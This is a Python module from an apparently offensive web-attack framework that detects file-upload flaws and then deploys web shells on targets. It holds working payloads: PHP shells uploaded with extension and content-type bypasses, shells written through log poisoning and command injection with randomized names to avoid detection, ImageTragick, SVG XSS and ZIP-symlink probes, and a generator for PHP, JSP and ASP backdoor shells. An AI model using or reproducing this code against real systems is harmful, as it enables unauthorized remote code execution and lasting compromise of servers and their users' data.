#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Shell Uploader Module
Web shell upload and management
"""

import os
import re
import time


from config import Config, Colors
from modules.base import BaseModule


class ShellUploader(BaseModule):
    """Web Shell Upload Module

    When ``scan_only=True`` (the default during the scan phase), only
    vulnerability *detection* methods are executed.  Actual shell
    deployment (``run()``) is gated behind ``scan_only=False`` which is
    set during the exploit phase.
    """

    name = "File Upload"
    vuln_type = "upload"

    def __init__(self, engine, scan_only=True):
        super().__init__(engine)
        self.scan_only = scan_only
        self.shells_dir = Config.SHELLS_DIR

        # Ensure shells directory exists
        os.makedirs(self.shells_dir, exist_ok=True)

    def test(self, url: str, method: str, param: str, value: str):
        """Test for file upload vulnerabilities via parameter testing"""
        pass  # Upload tests are handled by run() with forms

    def test_url(self, url: str):
        """Test URL for file upload vulnerabilities"""
        self._test_svg_xss(url)
        self._test_imagetragick(url)
        self._test_content_type_mismatch(url)
        self._test_zip_symlink(url)

    def _test_svg_xss(self, url: str):
        """Test SVG XSS upload"""
        svg = (
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>SVG XSS</text></svg>'
        )
        try:
            files = {"file": ("test.svg", svg.encode(), "image/svg+xml")}
            response = self.requester.request(url, "POST", files=files)
            if response and ("svg" in response.text.lower() or response.status_code == 200):
                from core.engine import Finding

                self.engine.add_finding(
                    Finding(
                        technique="File Upload (SVG XSS)",
                        url=url,
                        severity="MEDIUM",
                        confidence=0.6,
                        param="file",
                        payload="test.svg with onload=alert(1)",
                        evidence="SVG file with XSS accepted",
                    )
                )
        except Exception:
            pass

    def _test_imagetragick(self, url: str):
        """Test ImageMagick exploit (ImageTragick)"""
        payload = 'push graphic-context\nviewbox 0 0 640 480\nfill "url(https://example.com/image.jpg|id)"\npop graphic-context\n'
        try:
            files = {"file": ("exploit.mvg", payload.encode(), "image/x-mvg")}
            response = self.requester.request(url, "POST", files=files)
            if response and response.status_code in (200, 201, 301, 302):
                from core.engine import Finding

                self.engine.add_finding(
                    Finding(
                        technique="File Upload (ImageTragick)",
                        url=url,
                        severity="HIGH",
                        confidence=0.5,
                        param="file",
                        payload="exploit.mvg",
                        evidence="ImageMagick exploit accepted",
                    )
                )
        except Exception:
            pass

    def _test_content_type_mismatch(self, url: str):
        """Test content-type mismatch bypass"""
        for fname, content, ctype in [
            ("shell.php", b'<?php system($_GET["cmd"]); ?>', "image/png"),
            ("shell.phtml", b'<?php system($_GET["cmd"]); ?>', "image/gif"),
        ]:
            try:
                files = {"file": (fname, content, ctype)}
                response = self.requester.request(url, "POST", files=files)
                if response and response.status_code in (200, 201):
                    from core.engine import Finding

                    self.engine.add_finding(
                        Finding(
                            technique="File Upload (Content-Type Mismatch)",
                            url=url,
                            severity="HIGH",
                            confidence=0.6,
                            param="file",
                            payload=f"{fname} as {ctype}",
                            evidence="PHP file accepted with image content-type",
                        )
                    )
                    return
            except Exception:
                continue

    def _test_zip_symlink(self, url: str):
        """Test ZIP symlink attack"""
        import zipfile
        import io

        try:
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w") as zf:
                info = zipfile.ZipInfo("symlink.txt")
                info.create_system = 3
                info.external_attr = 0xA1ED0000
                zf.writestr(info, "/etc/passwd")
            buf.seek(0)
            files = {"file": ("test.zip", buf.read(), "application/zip")}
            response = self.requester.request(url, "POST", files=files)
            if response and response.status_code in (200, 201):
                from core.engine import Finding

                self.engine.add_finding(
                    Finding(
                        technique="File Upload (ZIP Symlink Attack)",
                        url=url,
                        severity="HIGH",
                        confidence=0.5,
                        param="file",
                        payload="ZIP with symlink to /etc/passwd",
                        evidence="ZIP with symlink accepted",
                    )
                )
        except Exception:
            pass

    def run(self, findings: list, forms: list):
        """Attempt to upload shells based on findings.

        .. note::

            This method performs **exploitation** (shell deployment).  During
            the scan phase only :meth:`test_url` should be called to *detect*
            upload vulnerabilities.  Shell deployment is deferred to the
            exploit phase when ``--shell`` or ``--auto-exploit`` is active.
        """
        if self.scan_only:
            return
        print(f"{Colors.info('Attempting shell uploads...')}")

        # Try upload via file upload forms
        for form in forms:
            if self._is_upload_form(form):
                self._try_upload_shells(form)

        # Try upload via LFI/RCE findings
        for finding in findings:
            if finding.technique.startswith("LFI") or finding.technique.startswith("RFI"):
                self._try_lfi_shell(finding)
            elif finding.technique.startswith("Command Injection"):
                self._try_rce_shell(finding)

    def _is_upload_form(self, form: dict) -> bool:
        """Check if form is a file upload form"""
        for inp in form.get("inputs", []):
            if inp.get("type") == "file":
                return True
        return False

    def _try_upload_shells(self, form: dict):
        """Try to upload various shell types"""
        url = form.get("url", "")
        method = form.get("method", "POST")

        # Find file input
        file_input = None
        for inp in form.get("inputs", []):
            if inp.get("type") == "file":
                file_input = inp["name"]
                break

        if not file_input:
            return

        # Shell payloads
        shells = [
            ("shell.php", '<?php system($_GET["cmd"]); ?>', "image/jpeg"),
            ("shell.php3", '<?php system($_GET["cmd"]); ?>', "image/jpeg"),
            ("shell.phtml", '<?php system($_GET["cmd"]); ?>', "image/jpeg"),
            ("shell.php.jpg", '<?php system($_GET["cmd"]); ?>', "image/jpeg"),
            ("shell.gif.php", 'GIF89a<?php system($_GET["cmd"]); ?>', "image/gif"),
            ("shell.php%00.jpg", '<?php system($_GET["cmd"]); ?>', "image/jpeg"),
        ]

        for filename, content, content_type in shells:
            try:
                files = {
                    file_input: (filename, content, content_type),
                }

                response = self.requester.request(url, method, files=files)

                if response and response.status_code == 200:
                    # Try to find uploaded shell URL
                    shell_url = self._find_uploaded_shell(response, filename)

                    if shell_url:
                        # Verify shell works
                        if self._verify_shell(shell_url):
                            from utils.database import Database

                            db = Database()
                            db.save_shell(
                                shell_id=f"shell_{int(time.time())}",
                                url=shell_url,
                                shell_type="php",
                                password="cmd",
                            )

                            print(f"{Colors.success(f'Shell uploaded: {shell_url}')}")

                            from core.engine import Finding

                            finding = Finding(
                                technique="Shell Upload",
                                url=url,
                                severity="CRITICAL",
                                confidence=1.0,
                                param=file_input,
                                payload=filename,
                                evidence=f"Shell uploaded to: {shell_url}",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Shell upload error: {e}')}")

    def _find_uploaded_shell(self, response, filename: str) -> str:
        """Find URL of uploaded shell in the response.

        Uses multiple strategies:
        1. Look for any URL containing common upload directory names.
        2. Match the exact filename in href/src attributes.
        3. Look for a 'Location' redirect header pointing to the upload.
        4. Look for JSON responses containing a URL or path field.
        """
        found_urls = []

        # Strategy 1: generic upload-directory URLs in the response body
        generic_pattern = (
            r'(https?://[^"\'<>\s]+/(?:uploads?|files?|images?|media|assets|content|static|tmp)/[^"\'<>\s]+)'
        )
        found_urls.extend(re.findall(generic_pattern, response.text))

        # Strategy 2: href/src with exact filename
        name_escaped = re.escape(filename)
        for attr in ("href", "src", "data-url", "action"):
            pattern = rf'{attr}=["\']([^"\']*{name_escaped}[^"\']*)["\']'
            found_urls.extend(re.findall(pattern, response.text, re.IGNORECASE))

        # Strategy 3: redirect Location header
        location = response.headers.get("Location", "") if hasattr(response, "headers") else ""
        if location and ("upload" in location.lower() or filename in location):
            found_urls.append(location)

        # Strategy 4: JSON body with url/path/file keys
        try:
            body = response.json() if hasattr(response, "json") else {}
            for key in ("url", "path", "file", "fileUrl", "file_url", "data", "link", "location"):
                val = body.get(key, "")
                if isinstance(val, str) and val:
                    found_urls.append(val)
                elif isinstance(val, dict):
                    for subkey in ("url", "path"):
                        subval = val.get(subkey, "")
                        if subval:
                            found_urls.append(subval)
        except Exception:
            pass

        # Deduplicate while preserving order and prefer exact filename matches
        seen = set()
        exact = []
        others = []
        base_name = filename.split(".")[0] if filename else ""
        for u in found_urls:
            if u not in seen:
                seen.add(u)
                if base_name and base_name in u:
                    exact.append(u)
                else:
                    others.append(u)
        ordered = exact + others
        return ordered[0] if ordered else None

    def _verify_shell(self, shell_url: str) -> bool:
        """Verify shell is working"""
        try:
            test_url = f"{shell_url}?cmd=echo+shell_works"
            response = self.requester.request(test_url, "GET")

            if response and "shell_works" in response.text:
                return True
        except Exception:
            pass

        return False

    def _try_lfi_shell(self, finding):
        """Try to get shell via LFI/log poisoning"""
        url = finding.url
        param = finding.param

        # Try log poisoning: inject PHP code via User-Agent, then include the log file
        shell_code = '<?php system($_GET["cmd"]); ?>'
        log_paths = [
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "../../../proc/self/environ",
        ]

        try:
            # Inject shell code via User-Agent header
            headers = {"User-Agent": shell_code}
            self.requester.request(url, "GET", headers=headers)

            # Try to include the poisoned log file and execute a test command
            for log_path in log_paths:
                # Build request with both the LFI param and cmd param in query string
                from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [log_path]
                params["cmd"] = ["echo lfi_shell_test"]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                response = self.requester.request(test_url, "GET")

                if response and "lfi_shell_test" in response.text:
                    print(f"{Colors.success(f'LFI shell via log poisoning: {log_path}')}")

                    from core.engine import Finding

                    lfi_finding = Finding(
                        technique="Shell via LFI (Log Poisoning)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=log_path,
                        evidence="Code execution achieved via log poisoning",
                    )
                    self.engine.add_finding(lfi_finding)
                    return

        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'LFI shell error: {e}')}")

    def _try_rce_shell(self, finding):
        """Try to get shell via RCE"""
        url = finding.url
        param = finding.param

        # Use a randomized shell filename to avoid detection
        import uuid

        shell_name = f"s{uuid.uuid4().hex[:8]}.php"

        # Write a shell directly on the target using echo/printf
        shell_code = '<?php system($_GET["cmd"]); ?>'
        web_roots = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http"]

        for web_root in web_roots:
            shell_path = f"{web_root}/{shell_name}"
            shell_commands = [
                f"echo '{shell_code}' > {shell_path}",
                f"printf '{shell_code}' > {shell_path}",
            ]

            for cmd in shell_commands:
                try:
                    data = {param: f"; {cmd}"}
                    response = self.requester.request(url, "POST", data=data)

                    if response:
                        # Verify the shell was written by trying to access it
                        from urllib.parse import urlparse

                        parsed = urlparse(url)
                        shell_url = f"{parsed.scheme}://{parsed.netloc}/{shell_name}?cmd=echo+rce_shell_test"
                        verify = self.requester.request(shell_url, "GET")

                        if verify and "rce_shell_test" in verify.text:
                            print(f"{Colors.success(f'RCE shell written: {shell_url}')}")

                            from core.engine import Finding

                            rce_finding = Finding(
                                technique="Shell via RCE",
                                url=url,
                                severity="CRITICAL",
                                confidence=1.0,
                                param=param,
                                payload=cmd[:80],
                                evidence=f"Shell written to: {shell_path}",
                            )
                            self.engine.add_finding(rce_finding)
                            return

                except Exception as e:
                    if self.engine.config.get("verbose"):
                        print(f"{Colors.error(f'RCE shell error: {e}')}")

    def generate_shell(self, shell_type: str = "php") -> str:
        """Generate web shell code"""
        shells = {
            "php": """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>""",
            "php_advanced": """<?php
$password = "atomic";
if(!isset($_GET['p']) || $_GET['p'] !== $password) {
    die("Access Denied");
}
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>""",
            "jsp": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>""",
            "asp": """<%
Dim cmd
cmd = Request("cmd")
If cmd <> "" Then
    Dim shell
    Set shell = Server.CreateObject("WScript.Shell")
    Dim output
    Set output = shell.Exec(cmd)
    Response.Write("<pre>" & output.StdOut.ReadAll() & "</pre>")
End If
%>""",
        }

        return shells.get(shell_type, shells["php"])
